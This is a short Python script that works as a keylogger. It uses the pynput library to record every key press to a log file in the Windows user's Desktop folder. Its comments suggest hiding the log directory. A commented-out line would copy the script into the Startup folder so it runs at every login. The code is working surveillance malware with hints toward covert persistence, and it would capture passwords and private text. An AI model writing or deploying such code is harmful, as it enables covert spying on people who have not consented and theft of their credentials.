from pynput.keyboard import Listener

import os
import logging
from shutil import copyfile

# gets the username from the os
username = os.getlogin()

# sets up the logging directory (can be placed in hidden directory)
logging_directory = f"C:/Users/{username}/Desktop"

# runs main.py in the startup (Windows and Python required)
# copyfile('main.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.py')
logging.basicConfig(filename=f"{logging_directory}/mylog.txt", 
                    level=logging.DEBUG, 
                    format="%(asctime)s: %(message)s") 

# key_handler logs the key to the logger
def key_handler(key):
    logging.info(key)

# listener.join() monitors the keyboard depending on the function passed in on Listener()
with Listener(on_press=key_handler) as listener:
    listener.join()